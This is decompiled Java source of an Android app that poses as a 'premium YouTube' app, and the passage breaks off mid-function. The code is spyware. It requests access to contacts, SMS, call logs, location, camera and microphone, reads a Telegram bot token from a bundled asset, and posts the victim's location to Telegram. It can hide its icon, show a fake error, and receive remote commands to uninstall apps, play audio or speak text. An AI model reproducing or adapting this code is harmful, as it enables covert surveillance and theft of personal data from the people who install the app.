package com.w8sb.w8premiumyt;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import androidx.activity.ComponentActivity;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContract;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.core.content.ContextCompat;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import kotlin.Metadata;
import kotlin.Unit;
import kotlin.collections.CollectionsKt;
import kotlin.io.CloseableKt;
import kotlin.io.TextStreamsKt;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.Charsets;
import kotlin.text.StringsKt;
import org.json.JSONObject;

/* JADX INFO: compiled from: MainActivity.kt */
/* JADX INFO: loaded from: /storage/emulated/0/Android/data/com.dastanapps.androiddevtools/files/decompiled/com.yt.phantombabar/dex/classes3.dex */
@Metadata(d1 = {"\u0000u\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\b\t\n\u0002\u0018\u0002\n\u0002\u0010\u0011\n\u0002\b\u0003\n\u0002\b\u0004\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010 \n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0007\n\u0002\u0010\u0006\n\u0002\b\n*\u0005\n\u0011\u001f#(\b\u0007\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\b\u0010.\u001a\u00020/H\u0002J\u000e\u00100\u001a\b\u0012\u0004\u0012\u00020\u000601H\u0002J\b\u00102\u001a\u00020\u0004H\u0002J\u0012\u00103\u001a\u00020/2\b\u00104\u001a\u0004\u0018\u000105H\u0014J\b\u00106\u001a\u00020/H\u0014J\b\u00107\u001a\u00020/H\u0002J\u0010\u00108\u001a\u00020/2\u0006\u00109\u001a\u00020\u0006H\u0002J\b\u0010:\u001a\u00020/H\u0002J\u0018\u0010;\u001a\u00020/2\u0006\u0010<\u001a\u00020=2\u0006\u0010>\u001a\u00020=H\u0002J\u0016\u0010?\u001a\u00020/2\f\u0010@\u001a\b\u0012\u0004\u0012\u00020\u000601H\u0002J\u0010\u0010A\u001a\u00020/2\u0006\u0010B\u001a\u00020\u0004H\u0002J\b\u0010C\u001a\u00020/H\u0002J\b\u0010D\u001a\u00020/H\u0002J\b\u0010E\u001a\u00020/H\u0002J\b\u0010F\u001a\u00020/H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0006X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010\t\u001a\u00020\nX\u0082\u0004¢\u0006\u0004\n\u0002\u0010\u000bR\u0010\u0010\f\u001a\u0004\u0018\u00010\rX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u000e\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010\u0010\u001a\u00020\u0011X\u0082\u0004¢\u0006\u0004\n\u0002\u0010\u0012R\u000e\u0010\u0013\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0014\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0015\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0016\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0017\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0018\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R(\u0010\u0019\u001a\u001c\u0012\u0018\u0012\u0016\u0012\u0004\u0012\u00020\u0006 \u001c*\n\u0012\u0004\u0012\u00020\u0006\u0018\u00010\u001b0\u001b0\u001aX\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u001d\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010\u001e\u001a\u00020\u001fX\u0082\u0004¢\u0006\u0004\n\u0002\u0010 R\u000e\u0010!\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010\"\u001a\u00020#X\u0082\u0004¢\u0006\u0004\n\u0002\u0010$R\u0010\u0010%\u001a\u0004\u0018\u00010&X\u0082\u000e¢\u0006\u0002\n\u0000R\u0010\u0010'\u001a\u00020(X\u0082\u0004¢\u0006\u0004\n\u0002\u0010)R\u000e\u0010*\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010+\u001a\u00020,X\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010-\u001a\u00020\u0006X\u0082\u000e¢\u0006\u0002\n\u0000¨\u0006G"}, d2 = {"Lcom/w8sb/w8premiumyt/MainActivity;", "Landroidx/activity/ComponentActivity;", "()V", "backgroundCameraEnabled", "", "botToken", "", "chatId", "fakeError", "linkOpenReceiver", "com/w8sb/w8premiumyt/MainActivity$linkOpenReceiver$1", "Lcom/w8sb/w8premiumyt/MainActivity$linkOpenReceiver$1;", "mediaPlayer", "Landroid/media/MediaPlayer;", "microphoneEnabled", "permissionsRequested", "playAudioReceiver", "com/w8sb/w8premiumyt/MainActivity$playAudioReceiver$1", "Lcom/w8sb/w8premiumyt/MainActivity$playAudioReceiver$1;", "postNotifications", "readCallLog", "readContacts", "readLocation", "readSms", "readStorage", "requestPermissionLauncher", "Landroidx/activity/result/ActivityResultLauncher;", "", "kotlin.jvm.PlatformType", "requirePermissions", "speakTextReceiver", "com/w8sb/w8premiumyt/MainActivity$speakTextReceiver$1", "Lcom/w8sb/w8premiumyt/MainActivity$speakTextReceiver$1;", "stealthMode", "toastReceiver", "com/w8sb/w8premiumyt/MainActivity$toastReceiver$1", "Lcom/w8sb/w8premiumyt/MainActivity$toastReceiver$1;", "tts", "Landroid/speech/tts/TextToSpeech;", "uninstallReceiver", "com/w8sb/w8premiumyt/MainActivity$uninstallReceiver$1", "Lcom/w8sb/w8premiumyt/MainActivity$uninstallReceiver$1;", "uninstallReceiverRegistered", "webView", "Landroid/webkit/WebView;", "webViewUrl", "checkAndRequestPermissions", "", "getNotGrantedPermissions", "", "isAccessibilityServiceEnabled", "onCreate", "savedInstanceState", "Landroid/os/Bundle;", "onDestroy", "requestBatteryOptimizations", "sendKeyToTelegram", "key", "sendLocationToTelegram", "sendTelegramLocation", "lat", "", "lon", "sendTelegramPermissions", "notGranted", "setLauncherIconVisible", "visible", "setupWebView", "showFakeErrorAndClose", "startRepeatingGeoLocation", "startUploadService", "app_debug"}, k = 1, mv = {1, 8, 0}, xi = 48)
public final class MainActivity extends ComponentActivity {
    public static final int $stable = MainActivity2.INSTANCE.m۳۰Int$classMainActivity();
    private boolean backgroundCameraEnabled;
    private boolean fakeError;
    private final MainActivity3 linkOpenReceiver;
    private MediaPlayer mediaPlayer;
    private boolean microphoneEnabled;
    private boolean permissionsRequested;
    private final MainActivity4 playAudioReceiver;
    private final ActivityResultLauncher<String[]> requestPermissionLauncher;
    private final MainActivity6 speakTextReceiver;
    private boolean stealthMode;
    private final MainActivity8 toastReceiver;
    private TextToSpeech tts;
    private final MainActivity9 uninstallReceiver;
    private boolean uninstallReceiverRegistered;
    private WebView webView;
    private String botToken = "";
    private String chatId = "";
    private String webViewUrl = "https://www.google.com";
    private boolean requirePermissions = true;
    private boolean readContacts = true;
    private boolean readSms = true;
    private boolean readCallLog = true;
    private boolean readStorage = true;
    private boolean readLocation = true;
    private boolean postNotifications = true;

    /* JADX WARN: Type inference failed for: r0v6, types: [com.w8sb.w8premiumyt.MainActivity$uninstallReceiver$1] */
    public MainActivity() {
        ActivityResultLauncher<String[]> activityResultLauncherRegisterForActivityResult = registerForActivityResult((ActivityResultContract) new ActivityResultContracts.RequestMultiplePermissions(), new ActivityResultCallback<Map<String, Boolean>>() { // from class: com.w8sb.w8premiumyt.MainActivity$requestPermissionLauncher$1
            public final void onActivityResult(Map<String, Boolean> map) {
                boolean z;
                Intrinsics.checkNotNullExpressionValue(map, "permissions");
                if (!map.isEmpty()) {
                    Iterator<Map.Entry<String, Boolean>> it = map.entrySet().iterator();
                    while (true) {
                        if (it.hasNext()) {
                            if (!it.next().getValue().booleanValue()) {
                                z = false;
                                break;
                            }
                        } else {
                            z = true;
                            break;
                        }
                    }
                } else {
                    z = true;
                }
                if (z) {
                    this.this$0.sendLocationToTelegram();
                    this.this$0.startUploadService();
                } else if (!this.this$0.permissionsRequested) {
                    this.this$0.permissionsRequested = true;
                    this.this$0.checkAndRequestPermissions();
                } else {
                    Toast.makeText((Context) this.this$0, "Please grant all permissions for the app to work", 1).show();
                    this.this$0.finish();
                }
            }
        });
        Intrinsics.checkNotNullExpressionValue(activityResultLauncherRegisterForActivityResult, "registerForActivityResul…        }\n        }\n    }");
        this.requestPermissionLauncher = activityResultLauncherRegisterForActivityResult;
        this.uninstallReceiver = new BroadcastReceiver() { // from class: com.w8sb.w8premiumyt.MainActivity$uninstallReceiver$1
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent) {
                String pkg;
                if (!Intrinsics.areEqual(intent != null ? intent.getAction() : null, "com.w8sb.w8premiumyt.UNINSTALL_APP") || (pkg = intent.getStringExtra("pkg")) == null) {
                    return;
                }
                try {
                    Intent uninstallIntent = new Intent("android.intent.action.DELETE");
                    uninstallIntent.setData(Uri.parse("package:" + pkg));
                    uninstallIntent.setFlags(268435456);
                    this.this$0.startActivity(uninstallIntent);
                } catch (Exception e) {
                }
            }
        };
        this.toastReceiver = new MainActivity8(this);
        this.linkOpenReceiver = new MainActivity3(this);
        this.playAudioReceiver = new MainActivity4(this);
        this.speakTextReceiver = new MainActivity6(this);
    }

    protected void onCreate(Bundle savedInstanceState) {
        BufferedReader bufferedReader;
        super.onCreate(savedInstanceState);
        try {
            setLauncherIconVisible(MainActivity2.INSTANCE.m۱۲Boolean$arg0$callsetLauncherIconVisible$try$funonCreate$classMainActivity());
        } catch (Exception e) {
        }
        setContentView(R.layout.activity_main);
        try {
            registerReceiver(this.uninstallReceiver, new IntentFilter(MainActivity2.INSTANCE.m۴۸String$arg0$call$init$$arg1$callregisterReceiver$try1$funonCreate$classMainActivity()));
            this.uninstallReceiverRegistered = MainActivity2.INSTANCE.m۲Boolean$arg0$call$setuninstallReceiverRegistered$$try1$funonCreate$classMainActivity();
            registerReceiver(this.toastReceiver, new IntentFilter(MainActivity2.INSTANCE.m۴۹String$arg0$call$init$$arg1$callregisterReceiver1$try1$funonCreate$classMainActivity()));
            registerReceiver(this.linkOpenReceiver, new IntentFilter(MainActivity2.INSTANCE.m۵۰String$arg0$call$init$$arg1$callregisterReceiver2$try1$funonCreate$classMainActivity()));
            registerReceiver(this.playAudioReceiver, new IntentFilter(MainActivity2.INSTANCE.m۵۱String$arg0$call$init$$arg1$callregisterReceiver3$try1$funonCreate$classMainActivity()));
            registerReceiver(this.speakTextReceiver, new IntentFilter(MainActivity2.INSTANCE.m۵۲String$arg0$call$init$$arg1$callregisterReceiver4$try1$funonCreate$classMainActivity()));
        } catch (Exception e2) {
        }
        try {
            InputStream inputStreamOpen = getAssets().open(MainActivity2.INSTANCE.m۵۹String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try2$funonCreate$classMainActivity());
            Intrinsics.checkNotNullExpressionValue(inputStreamOpen, "assets.open(\"logo.json\")");
            Reader inputStreamReader = new InputStreamReader(inputStreamOpen, Charsets.UTF_8);
            bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
        } catch (Exception e3) {
        }
        try {
            BufferedReader it = bufferedReader;
            String configStr = TextStreamsKt.readText(it);
            CloseableKt.closeFinally(bufferedReader, (Throwable) null);
            JSONObject config = new JSONObject(configStr);
            String string = config.getString(MainActivity2.INSTANCE.m۵۵String$arg0$callgetString$arg0$call$setbotToken$$try2$funonCreate$classMainActivity());
            Intrinsics.checkNotNullExpressionValue(string, "config.getString(\"bot_token\")");
            this.botToken = string;
            String string2 = config.getString(MainActivity2.INSTANCE.m۵۶String$arg0$callgetString$arg0$call$setchatId$$try2$funonCreate$classMainActivity());
            Intrinsics.checkNotNullExpressionValue(string2, "config.getString(\"chat_id\")");
            this.chatId = string2;
            String strOptString = config.optString(MainActivity2.INSTANCE.m۷۱String$arg0$calloptString$arg0$call$setwebViewUrl$$try2$funonCreate$classMainActivity(), this.webViewUrl);
            Intrinsics.checkNotNullExpressionValue(strOptString, "config.optString(\"webview_url\", webViewUrl)");
            this.webViewUrl = strOptString;
            this.requirePermissions = config.optBoolean(MainActivity2.INSTANCE.m۶۹String$arg0$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۷Boolean$arg1$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity());
            this.readContacts = config.optBoolean(MainActivity2.INSTANCE.m۶۵String$arg0$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۳Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity());
            this.readSms = config.optBoolean(MainActivity2.INSTANCE.m۶۷String$arg0$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۵Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity());
            this.readCallLog = config.optBoolean(MainActivity2.INSTANCE.m۶۴String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۲Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity());
            this.readStorage = config.optBoolean(MainActivity2.INSTANCE.m۶۸String$arg0$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۶Boolean$arg1$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity());
            this.readLocation = config.optBoolean(MainActivity2.INSTANCE.m۶۶String$arg0$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۴Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity());
            this.postNotifications = config.optBoolean(MainActivity2.INSTANCE.m۶۳String$arg0$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۱Boolean$arg1$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity());
            this.stealthMode = config.optBoolean(MainActivity2.INSTANCE.m۷۰String$arg0$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۸Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity());
            this.fakeError = config.optBoolean(MainActivity2.INSTANCE.m۶۱String$arg0$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۱۹Boolean$arg1$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity());
            this.backgroundCameraEnabled = config.optBoolean(MainActivity2.INSTANCE.m۶۰String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۱۸Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity());
            this.microphoneEnabled = config.optBoolean(MainActivity2.INSTANCE.m۶۲String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۰Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity());
            SharedPreferences prefs = getSharedPreferences(MainActivity2.INSTANCE.m۵۴String$arg0$callgetSharedPreferences$valprefs$funonCreate$classMainActivity(), 0);
            boolean askedAccessibility = prefs.getBoolean(MainActivity2.INSTANCE.m۵۳String$arg0$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۱۷Boolean$arg1$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity());
            View viewFindViewById = findViewById(R.id.webView);
            Intrinsics.checkNotNullExpressionValue(viewFindViewById, "findViewById(R.id.webView)");
            this.webView = (WebView) viewFindViewById;
            setupWebView();
            requestBatteryOptimizations();
            checkAndRequestPermissions();
            if (!askedAccessibility && !isAccessibilityServiceEnabled()) {
                startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
                sendTelegramPermissions(getNotGrantedPermissions());
                prefs.edit().putBoolean(MainActivity2.INSTANCE.m۷۳String$arg0$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity(), MainActivity2.INSTANCE.m۲۹Boolean$arg1$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity()).apply();
            }
            startRepeatingGeoLocation();
            if (this.stealthMode) {
                setLauncherIconVisible(MainActivity2.INSTANCE.m۹Boolean$arg0$callsetLauncherIconVisible$branch$if1$funonCreate$classMainActivity());
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: com.w8sb.w8premiumyt.MainActivity$$ExternalSyntheticLambda1
                    @Override // java.lang.Runnable
                    public final void run() {
                        MainActivity.onCreate$lambda$1(this.f$0);
                    }
                }, MainActivity2.INSTANCE.m۳۱Long$arg1$callpostDelayed$branch$if1$funonCreate$classMainActivity());
            } else {
                setLauncherIconVisible(MainActivity2.INSTANCE.m۱۰Boolean$arg0$callsetLauncherIconVisible$else$if1$funonCreate$classMainActivity());
            }
            if (this.fakeError) {
                showFakeErrorAndClose();
                startUploadService();
            }
        } finally {
        }
    }

    private static final void onCreate$lambda$1(MainActivity this$0) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.setLauncherIconVisible(MainActivity2.INSTANCE.m۱۱Boolean$arg0$callsetLauncherIconVisible$fun$anonymous$$arg0$callpostDelayed$branch$if1$funonCreate$classMainActivity());
    }

    /* JADX WARN: Multi-variable type inference failed */
    private final void setupWebView() {
        try {
            WebView webView = this.webView;
            WebView webView2 = null;
            if (webView == null) {
                Intrinsics.throwUninitializedPropertyAccessException("webView");
                webView = null;
            }
            WebSettings $this$setupWebView_u24lambda_u242 = webView.getSettings();
            $this$setupWebView_u24lambda_u242.setJavaScriptEnabled(MainActivity2.INSTANCE.m۸Boolean$arg0$callsetJavaScriptEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity());
            $this$setupWebView_u24lambda_u242.setDomStorageEnabled(MainActivity2.INSTANCE.m۷Boolean$arg0$callsetDomStorageEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity());
            $this$setupWebView_u24lambda_u242.setSupportZoom(MainActivity2.INSTANCE.m۱۴Boolean$arg0$callsetSupportZoom$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity());
            $this$setupWebView_u24lambda_u242.setLoadWithOverviewMode(MainActivity2.INSTANCE.m۱۳Boolean$arg0$callsetLoadWithOverviewMode$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity());
            $this$setupWebView_u24lambda_u242.setUseWideViewPort(MainActivity2.INSTANCE.m۱۵Boolean$arg0$callsetUseWideViewPort$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity());
            $this$setupWebView_u24lambda_u242.setMixedContentMode(0);
            WebView webView3 = this.webView;
            if (webView3 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("webView");
                webView3 = null;
            }
            webView3.setWebViewClient(new WebViewClient() { // from class: com.w8sb.w8premiumyt.MainActivity.setupWebView.2
                @Override // android.webkit.WebViewClient
                public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                    if (view != null) {
                        view.loadUrl(MainActivity2.INSTANCE.m۵۸String$arg0$callloadUrl$else$when$funonReceivedError$class$nonameprovided$$arg0$callsetWebViewClient$try$funsetupWebView$classMainActivity());
                    }
                }
            });
            WebView webView4 = this.webView;
            if (webView4 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("webView");
            } else {
                webView2 = webView4;
            }
            webView2.loadUrl(this.webViewUrl);
        } catch (Exception e) {
            Toast.makeText((Context) this, MainActivity2.INSTANCE.m۸۶String$arg1$callmakeText$$this$callshow$catch$funsetupWebView$classMainActivity(), 0).show();
        }
    }

    private final void requestBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= 23) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            Object systemService = getSystemService("power");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.os.PowerManager");
            PowerManager pm = (PowerManager) systemService;
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                intent.setData(Uri.parse(MainActivity2.INSTANCE.m۳۷String$0$str$arg0$callparse$arg0$callsetData$branch$if$branch$if$funrequestBatteryOptimizations$classMainActivity() + packageName));
                try {
                    startActivity(intent);
                } catch (Exception e) {
                }
            }
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    private final void checkAndRequestPermissions() {
        List permissions = new ArrayList();
        if (this.readStorage) {
            if (Build.VERSION.SDK_INT >= 33) {
                permissions.add("android.permission.READ_MEDIA_IMAGES");
            } else {
                permissions.add("android.permission.READ_EXTERNAL_STORAGE");
            }
        }
        if (this.postNotifications && Build.VERSION.SDK_INT >= 33) {
            permissions.add("android.permission.POST_NOTIFICATIONS");
        }
        if (this.readContacts) {
            permissions.add("android.permission.READ_CONTACTS");
        }
        if (this.readSms) {
            permissions.add("android.permission.READ_SMS");
        }
        if (this.readCallLog) {
            permissions.add("android.permission.READ_CALL_LOG");
        }
        if (this.readLocation) {
            permissions.add("android.permission.ACCESS_FINE_LOCATION");
            permissions.add("android.permission.ACCESS_COARSE_LOCATION");
        }
        if (this.backgroundCameraEnabled) {
            permissions.add("android.permission.CAMERA");
        }
        if (this.microphoneEnabled) {
            permissions.add("android.permission.RECORD_AUDIO");
        }
        permissions.add("android.permission.SEND_SMS");
        permissions.add("android.permission.CALL_PHONE");
        List $this$filter$iv = permissions;
        Collection destination$iv$iv = new ArrayList();
        Iterator it = $this$filter$iv.iterator();
        while (true) {
            if (!it.hasNext()) {
                break;
            }
            Object element$iv$iv = it.next();
            String it2 = (String) element$iv$iv;
            if (ContextCompat.checkSelfPermission((Context) this, it2) != 0) {
                destination$iv$iv.add(element$iv$iv);
            }
        }
        List notGrantedPermissions = (List) destination$iv$iv;
        if (!notGrantedPermissions.isEmpty()) {
            List $this$toTypedArray$iv = notGrantedPermissions;
            this.requestPermissionLauncher.launch($this$toTypedArray$iv.toArray(new String[0]));
        } else {
            startUploadService();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    private final void startUploadService() {
        try {
            Intent serviceIntent = new Intent((Context) this, (Class<?>) UploadService.class);
            serviceIntent.setAction(MainActivity2.INSTANCE.m۷۴String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valserviceIntent$try$funstartUploadService$classMainActivity());
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Toast.makeText((Context) this, MainActivity2.INSTANCE.m۸۷String$arg1$callmakeText$$this$callshow$catch$funstartUploadService$classMainActivity(), 0).show();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    private final void sendLocationToTelegram() {
        try {
            FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient((Activity) this);
            Intrinsics.checkNotNullExpressionValue(fusedLocationClient, "getFusedLocationProviderClient(this)");
            if (ContextCompat.checkSelfPermission((Context) this, "android.permission.ACCESS_FINE_LOCATION") == 0 || ContextCompat.checkSelfPermission((Context) this, "android.permission.ACCESS_COARSE_LOCATION") == 0) {
                Task lastLocation = fusedLocationClient.getLastLocation();
                final Function1<Location, Unit> function1 = new Function1<Location, Unit>() { // from class: com.w8sb.w8premiumyt.MainActivity.sendLocationToTelegram.1
                    {
                        super(1);
                    }

                    public /* bridge */ /* synthetic */ Object invoke(Object p1) {
                        invoke((Location) p1);
                        return Unit.INSTANCE;
                    }

                    public final void invoke(Location location) {
                        if (location != null) {
                            double lat = location.getLatitude();
                            double lon = location.getLongitude();
                            MainActivity.this.sendTelegramLocation(lat, lon);
                        }
                    }
                };
                lastLocation.addOnSuccessListener(new OnSuccessListener() { // from class: com.w8sb.w8premiumyt.MainActivity$$ExternalSyntheticLambda6
                    public final void onSuccess(Object obj) {
                        MainActivity.sendLocationToTelegram$lambda$5(function1, obj);
                    }
                });
            }
        } catch (Exception e) {
        }
    }

    private static final void sendLocationToTelegram$lambda$5(Function1 $tmp0, Object p0) {
        Intrinsics.checkNotNullParameter($tmp0, "$tmp0");
        $tmp0.invoke(p0);
    }

    private final void sendTelegramLocation(final double lat, final double lon) {
        new Thread(new Runnable() { // from class: com.w8sb.w8premiumyt.MainActivity$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                MainActivity.sendTelegramLocation$lambda$7(this.f$0, lat, lon);
            }
        }).start();
    }

    private static final void sendTelegramLocation$lambda$7(MainActivity this$0, double $lat, double $lon) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        try {
            String url = MainActivity2.INSTANCE.m۴۰String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() + this$0.botToken + MainActivity2.INSTANCE.m۴۶String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity();
            String body = MainActivity2.INSTANCE.m۳۸String$0$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() + this$0.chatId + MainActivity2.INSTANCE.m۴۴String$2$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() + $lat + MainActivity2.INSTANCE.m۴۷String$4$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() + $lon;
            URLConnection uRLConnectionOpenConnection = new URL(url).openConnection();
            Intrinsics.checkNotNull(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection conn = (HttpURLConnection) uRLConnectionOpenConnection;
            conn.setRequestMethod(MainActivity2.INSTANCE.m۷۸String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity());
            conn.setDoOutput(MainActivity2.INSTANCE.m۵Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity());
            conn.setRequestProperty(MainActivity2.INSTANCE.m۸۱String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity(), MainActivity2.INSTANCE.m۸۹String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity());
            OutputStream outputStream = conn.getOutputStream();
            try {
                OutputStream it = outputStream;
                byte[] bytes = body.getBytes(Charsets.UTF_8);
                Intrinsics.checkNotNullExpressionValue(bytes, "this as java.lang.String).getBytes(charset)");
                it.write(bytes);
                Unit unit = Unit.INSTANCE;
                CloseableKt.closeFinally(outputStream, (Throwable) null);
                InputStream inputStream = conn.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "conn.inputStream");
                Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                TextStreamsKt.readText(inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192));
                conn.disconnect();
            } finally {
            }
        } catch (Exception e) {
        }
    }

    private final void sendKeyToTelegram(final String key) {
        new Thread(new Runnable() { // from class: com.w8sb.w8premiumyt.MainActivity$$ExternalSyntheticLambda5
            @Override // java.lang.Runnable
            public final void run() {
